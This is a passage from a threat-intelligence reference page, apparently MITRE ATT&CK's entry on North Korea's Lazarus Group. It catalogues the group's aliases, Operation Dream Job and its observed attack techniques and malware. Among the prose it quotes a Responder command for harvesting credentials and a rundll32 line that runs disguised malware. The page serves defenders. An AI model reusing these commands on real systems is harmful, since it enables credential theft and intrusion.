"content": " Lazarus Group Lazarus Group is a North Korean state-sponsored cyber threat group that has been attributed to the Reconnaissance General Bureau.[1][2] The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by Lazarus Group correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain.[3] North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups, such as Andariel, APT37, APT38, and Kimsuky. ID: G0032 \u24d8 Associated Groups: Labyrinth Chollima, HIDDEN COBRA, Guardians of Peace, ZINC, NICKEL ACADEMY, Diamond Sleet Contributors: Kyaw Pyiyt Htet, @KyawPyiytHtet; Dragos Threat Intelligence; MyungUk Han, ASEC; Jun Hirata, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 4.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Labyrinth Chollima [4] HIDDEN COBRA The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA.[1][5] Guardians of Peace [1] ZINC [6] NICKEL ACADEMY [7] Diamond Sleet [8] Campaigns ID Name First Seen Last Seen References Techniques C0022 Operation Dream Job September 2019 [9] August 2020 [10] [10][11][12][9] Account Discovery: Domain Account, Acquire Infrastructure: Server, Acquire Infrastructure: Domains, Acquire Infrastructure: Web Services, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Brute Force, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure: Domains, Compromise Infrastructure: Server, Data from Local System, Debugger Evasion, Develop Capabilities: Code Signing Certificates, Develop Capabilities: Malware, Encrypted Channel: Symmetric Cryptography, Establish Accounts: Social Media Accounts, Establish Accounts: Email Accounts, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Gather Victim Identity Information, Gather Victim Org Information, Gather Victim Org Information: Identify Roles, Impersonation, Indicator Removal: File Deletion, Ingress Tool Transfer, Internal Spearphishing, Masquerading: Masquerade File Type, Native API, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, Obtain Capabilities: Code Signing Certificates, Obtain Capabilities: Tool, Phishing: Spearphishing via Service, Phishing: Spearphishing Attachment, Phishing: Spearphishing Link, Scheduled Task/Job: Scheduled Task, Search Open Websites/Domains: Social Media, Server Software Component: IIS Components, Stage Capabilities: Upload Malware, Stage Capabilities: Upload Tool, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Binary Proxy Execution: Regsvr32, System Location Discovery: System Language Discovery, Template Injection, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion, Windows Management Instrumentation, XSL Script Processing Techniques Used Domain ID Name Use Enterprise T1134 .002 Access Token Manipulation: Create Process with Token Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.[3][13] Enterprise T1087 .002 Account Discovery: Domain Account During Operation Dream Job, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts.[9] Enterprise T1098 Account Manipulation Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator\u2019s account.[3][14] Enterprise T1583 .001 Acquire Infrastructure: Domains Lazarus Group has acquired domains related to their campaigns to act as distribution points and C2 channels.[15][16] During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort.[9] .004 Acquire Infrastructure: Server During Operation Dream Job, Lazarus Group acquired servers to host their malicious tools.[9] .006 Acquire Infrastructure: Web Services Lazarus Group has hosted malicious downloads on Github.[15] During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive.[10] Enterprise T1557 .001 Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay Lazarus Group executed Responder using the command [Responder file path] -i [IP address] -rPv on a compromised host to harvest credentials and move laterally.[17] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Lazarus Group has conducted C2 over HTTP and HTTPS.[18][19][20][21][22][23] During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers.[11] Enterprise T1010 Application Window Discovery Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.[3][24][13] Enterprise T1560 Archive Collected Data Lazarus Group has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2. [24][25][18] .001 Archive via Utility During Operation Dream Job, Lazarus Group archived victim's data into a RAR file.[9] .002 Archive via Library Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.[25][18] .003 Archive via Custom Method A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.[3][24][25][18] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Lazarus Group has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.[3][25][18][21] During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence.[11] .009 Boot or Logon Autostart Execution: Shortcut Modification Lazarus Group malware has maintained persistence on a system by creating a LNK shortcut in the user\u2019s Startup folder.[18] Enterprise T1110 .003 Brute Force: Password Spraying Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.[3][25] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Lazarus Group has used PowerShell to execute commands and malicious code.[16] During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims.[9] .003 Command and Scripting Interpreter: Windows Command Shell Lazarus Group malware uses cmd.exe to execute commands on a compromised host.[3][14][18][26][22] A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.[27] During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell.[9][11] .005 Command and Scripting Interpreter: Visual Basic Lazarus Group has used VBA and embedded macros in Word documents to execute malicious code.[21][22] During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant.[10][11] Enterprise T1584 .001 Compromise Infrastructure: Domains For Operation Dream Job, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure.[11][12] .004 Compromise Infrastructure: Server Lazarus Group has compromised servers to stage malicious tools.[17] For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools.[10][9][11] Enterprise T1543 .003 Create or Modify System Process: Windows Service Several Lazarus Group malware families install themselves as new services.[3][14] Enterprise T1485 Data Destruction Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory.[3] Enterprise T1132 .001 Data Encoding: Standard Encoding A Lazarus Group malware sample encodes data with base64.[18] Enterprise T1005 Data from Local System Lazarus Group has collected data and files from compromised networks.[3][24][25][17] During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host.[10][11] Enterprise T1001 .003 Data Obfuscation: Protocol or Service Impersonation Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption.[3][14][18][28] Enterprise T1074 .001 Data Staged: Local Data Staging Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.[3][24] Enterprise T1622 Debugger Evasion During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers.[10] Enterprise T1491 .001 Defacement: Internal Defacement Lazarus Group replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe.[14] Enterprise T1140 Deobfuscate/Decode Files or Information Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.[21][22] Enterprise T1587 .001 Develop Capabilities: Malware Lazarus Group has developed custom malware for use in their operations.[15][16] For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations.[10][9][11][12] .002 Develop Capabilities: Code Signing Certificates During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility.[9] Enterprise T1561 .001 Disk Wipe: Disk Content Wipe Lazarus Group has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.[14] .002 Disk Wipe: Disk Structure Wipe Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.[26][3] Enterprise T1189 Drive-by Compromise Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website.[29][16] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads. Lazarus Group has also used AES to encrypt C2 traffic.[3][14][18][27] During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server.[11] Enterprise T1585 .001 Establish Accounts: Social Media Accounts Lazarus Group has created new Twitter accounts to conduct social engineering against potential victims.[16] For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts.[10][9] .002 Establish Accounts: Email Accounts Lazarus Group has created new email accounts for spearphishing operations.[17] During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt.[9] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.[3][25] Enterprise T1041 Exfiltration Over C2 Channel Lazarus Group has exfiltrated data and files over a C2 channel through its various tools and malware.[3][24][18] During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers.[10] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.[9][10] Enterprise T1203 Exploitation for Client Execution Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.[30] Enterprise T1008 Fallback Channels Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.[3][25] Enterprise T1083 File and Directory Discovery Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.[3][27][21][22] During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters.[10] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses Lazarus Group collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.[17] Enterprise T1591 Gather Victim Org Information Lazarus Group has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.[17] For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets.[10] .004 Identify Roles During Operation Dream Job, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements.[10][9] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.[18][19][20][21] Enterprise T1574 .001 Hijack Execution Flow: DLL Lazarus Group has replaced win_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload.[23] Lazarus Group utilized DLL side-loading to execute malicious payloads through abuse of the legitimate processes wsmprovhost.exe and dfrgui.exe.[31] .013 Hijack Execution Flow: KernelCallbackTable Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode.[21][22] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.[3][24][13][26]. .004 Impair Defenses: Disable or Modify System Firewall Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. [3][24][13] Enterprise T1656 Impersonation During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.[10][9][32] Enterprise T1070 Indicator Removal Lazarus Group has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked.[21] .003 Clear Command History Lazarus Group has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility.[17] .004 File Deletion Lazarus Group malware has deleted files in various ways, including \"suicide scripts\" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.[3][27] During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer.[9] .006 Timestomp Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.[3][14][24][27] Enterprise T1202 Indirect Command Execution Lazarus Group persistence mechanisms have used forfiles.exe to execute .htm files.[22] Enterprise T1105 Ingress Tool Transfer Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host.[3][14][24][19][20][17][16][21][22][23] During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host.[10][9][11] Enterprise T1056 .001 Input Capture: Keylogging Lazarus Group malware KiloAlfa contains keylogging functionality.[3][13] Enterprise T1534 Internal Spearphishing During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.[10] Enterprise T1036 .003 Masquerading: Rename Legitimate Utilities Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe.[22] .004 Masquerading: Masquerade Task or Service Lazarus Group has used a scheduled task named SRCheck to mask the execution of a malicious .dll.[23] .005 Masquerading: Match Legitimate Resource Name or Location Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.[33][22] .008 Masquerading: Masquerade File Type During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection.[11][9] Enterprise T1104 Multi-Stage Channels Lazarus Group has used multi-stage malware components that inject later stages into separate processes.[21] Enterprise T1106 Native API Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.[11] Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.[21][22] During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server.[11] Enterprise T1046 Network Service Discovery Lazarus Group has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.[17] Enterprise T1571 Non-Standard Port Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.[3][25] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection.[10][11][12] .007 Obfuscated Files or Information: Dynamic API Resolution Lazarus Group has used a custom hashing method to resolve APIs used in shellcode.[21] .009 Obfuscated Files or Information: Embedded Payloads Lazarus Group has distributed malicious payloads embedded in PNG files.[34] .013 Obfuscated Files or Information: Encrypted/Encoded File Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.[3][24][25][18][20][21][22] During Operation Dream Job, Lazarus Group encrypted malware such as DRATzarus with XOR and DLL files with base64.[10][9][11][12] Enterprise T1588 .002 Obtain Capabilities: Tool Lazarus Group has obtained a variety of tools for their operations, including Responder and PuTTy PSCP.[17] For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli.[10][9] .003 Obtain Capabilities: Code Signing Certificates During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools.[9] .004 Obtain Capabilities: Digital Certificates Lazarus Group has obtained SSL certificates for their C2 domains.[15] Enterprise T1566 .001 Phishing: Spearphishing Attachment Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.[30][17][21][22] During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers.[10][11] .002 Phishing: Spearphishing Link Lazarus Group has sent malicious links to victims via email.[17] During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email.[10][9] .003 Phishing: Spearphishing via Service Lazarus Group has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.[16] During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs.[10][9] Enterprise T1542 .003 Pre-OS Boot: Bootkit Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.[3][14] Enterprise T1057 Process Discovery Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.[3][24][18][27][20][21] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection A Lazarus Group malware sample performs reflective DLL injection.[18][21] Enterprise T1090 .001 Proxy: Internal Proxy Lazarus Group has used a compromised router to serve as a proxy between a victim network's corporate and restricted segments.[17] .002 Proxy: External Proxy Lazarus Group has used multiple proxies to obfuscate network traffic from victims.[35][20] Enterprise T1012 Query Registry Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.[3][24][18] Enterprise T1620 Reflective Code Loading Lazarus Group has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via KernelCallbackTable hijacking. Lazarus Group has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.[21][22] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Lazarus Group malware SierraCharlie uses RDP for propagation.[3][25] .002 Remote Services: SMB/Windows Admin Shares Lazarus Group malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.[3][25] .004 Remote Services: SSH Lazarus Group used SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network.[17] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Lazarus Group has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.[22][23] During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script.[9] Enterprise T1593 .001 Search Open Websites/Domains: Social Media For Operation Dream Job, Lazarus Group used LinkedIn to identify and target employees within a chosen organization.[9] Enterprise T1505 .004 Server Software Component: IIS Components During Operation Dream Job, Lazarus Group targeted Windows servers running Internet Information Systems (IIS) to install C2 components.[11] Enterprise T1489 Service Stop Lazarus Group has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.[14] Enterprise T1608 .001 Stage Capabilities: Upload Malware For Operation Dream Job, Lazarus Group used compromised servers to host malware.[10][9][11][12] .002 Stage Capabilities: Upload Tool For Operation Dream Job, Lazarus Group used multiple servers to host malicious tools.[9] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Lazarus Group has digitally signed malware and utilities to evade detection.[21] During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection.[9] Enterprise T1218 System Binary Proxy Execution Lazarus Group lnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL.[21][22] .005 Mshta Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents.[21][22] .010 Regsvr32 During Operation Dream Job, Lazarus Group used regsvr32 to execute malware.[9] .011 Rundll32 Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.[23] During Operation Dream Job, Lazarus Group executed malware with C:\\\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\", CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905.[10][9][11] Enterprise T1082 System Information Discovery Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.[3][14][24][18][27][21] Enterprise T1614 .001 System Location Discovery: System Language Discovery During Operation Dream Job, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.[10] Enterprise T1016 System Network Configuration Discovery Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card\u2019s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.[3][24] Enterprise T1049 System Network Connections Discovery Lazarus Group has used net use to identify and establish a network connection with a remote host.[17] Enterprise T1033 System Owner/User Discovery Various Lazarus Group malware enumerates logged-on users.[3][14][24][25][18][19][21] Enterprise T1529 System Shutdown/Reboot Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems.[26] Enterprise T1124 System Time Discovery A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server.[27] Enterprise T1221 Template Injection During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.[10][11] Enterprise T1204 .001 User Execution: Malicious Link During Operation Dream Job, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access.[10][9] .002 User Execution: Malicious File Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.[30][17][21][22] During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained \"dream job\" descriptions from defense, aerospace, and other sectors.[10][11] Enterprise T1078 Valid Accounts Lazarus Group has used administrator credentials to gain access to restricted network segments.[17] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services.[10] .003 Virtualization/Sandbox Evasion: Time Based Evasion During Operation Dream Job, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services.[10] Enterprise T1102 .002 Web Service: Bidirectional Communication Lazarus Group has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories.[21] Enterprise T1047 Windows Management Instrumentation Lazarus Group has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.[3][25][17][22] During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script.[9] Enterprise T1220 XSL Script Processing During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.[9] ICS T0865 Spearphishing Attachment Lazarus Group has been observed targeting organizations using spearphishing documents with embedded malicious payloads. [36] Highly targeted spear phishing campaigns have been conducted against a U.S. electric grid company. [37] Software ID Name References Techniques S0584 AppleJeus [15] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Unix Shell, Create or Modify System Process: Windows Service, Create or Modify System Process: Launch Daemon, Deobfuscate/Decode Files or Information, Event Triggered Execution: Installer Packages, Exfiltration Over C2 Channel, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Obfuscated Files or Information, Phishing: Spearphishing Link, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Msiexec, System Information Discovery, System Services: Launchctl, User Execution: Malicious File, User Execution: Malicious Link, Virtualization/Sandbox Evasion: Time Based Evasion S0347 AuditCred [38] Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Process Injection, Proxy S0245 BADCALL [39] Data Obfuscation: Protocol or Service Impersonation, Encrypted Channel: Symmetric Cryptography, Impair Defenses: Disable or Modify System Firewall, Modify Registry, Non-Standard Port, Proxy, System Information Discovery, System Network Configuration Discovery S0239 Bankshot [30] Access Token Manipulation: Create Process with Token, Account Discovery: Local Account, Account Discovery: Domain Account, Application Layer Protocol: Web Protocols, Automated Collection, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Non-Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Exploitation for Client Execution, File and Directory Discovery, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Indicator Removal, Ingress Tool Transfer, Modify Registry, Native API, Non-Standard Port, Process Discovery, Query Registry, System Information Discovery S0520 BLINDINGCAN [40] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, Phishing: Spearphishing Attachment, Shared Modules, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, User Execution: Malicious File S0498 Cryptoistic [19] Data from Local System, Encrypted Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Non-Application Layer Protocol, System Owner/User Discovery S0497 Dacls [19][20] Application Layer Protocol: Web Protocols, Create or Modify System Process: Launch Agent, Create or Modify System Process: Launch Daemon, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Masquerading, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery S0694 DRATzarus During Operation Dream Job, Lazarus Group used DRATzarus to deploy open source software and partly commodity software such as Responder, Wake-On-Lan, and ChromePass to target infected hosts.[10] Application Layer Protocol: Web Protocols, Data from Local System, Debugger Evasion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Process Discovery, Remote System Discovery, System Owner/User Discovery, System Time Discovery, Virtualization/Sandbox Evasion: Time Based Evasion S0567 Dtrack [41] Archive Collected Data, Boot or Logon Autostart Execution, Browser Information Discovery, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, File and Directory Discovery, Hijack Execution Flow, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Embedded Payloads, Process Discovery, Process Injection: Process Hollowing, Query Registry, Shared Modules, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Valid Accounts S0593 ECCENTRICBANDWAGON [42] Command and Scripting Interpreter: Windows Command Shell, Data Staged: Local Data Staging, Indicator Removal: File Deletion, Input Capture: Keylogging, Obfuscated Files or Information, Screen Capture S0181 FALLCHILL [35] Create or Modify System Process: Windows Service, Data Obfuscation: Protocol or Service Impersonation, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, System Information Discovery, System Network Configuration Discovery S0246 HARDRAIN [43] Command and Scripting Interpreter: Windows Command Shell, Data Obfuscation: Protocol or Service Impersonation, Impair Defenses: Disable or Modify System Firewall, Non-Standard Port, Proxy S0376 HOPLIGHT [5] Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Device Driver Discovery, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exfiltration Over C2 Channel, Fallback Channels, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Modify Registry, Non-Standard Port, OS Credential Dumping: Security Account Manager, Process Injection, Proxy, Query Registry, System Information Discovery, System Services: Service Execution, System Time Discovery, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0431 HotCroissant [44] Application Window Discovery, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Window, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Scheduled Task/Job: Scheduled Task, Screen Capture, Service Stop, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery S0271 KEYMARBLE [45] Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Modify Registry, Process Discovery, Screen Capture, System Information Discovery, System Network Configuration Discovery S1182 MagicRAT MagicRAT is exclusively associated with Lazarus Group operations in 2022.[46] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade File Type, Obfuscated Files or Information: Encrypted/Encoded File, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Network Configuration Discovery S0108 netsh [24] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0238 Proxysvc [27] Application Layer Protocol: Web Protocols, Automated Collection, Command and Scripting Interpreter: Windows Command Shell, Data Destruction, Data from Local System, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator 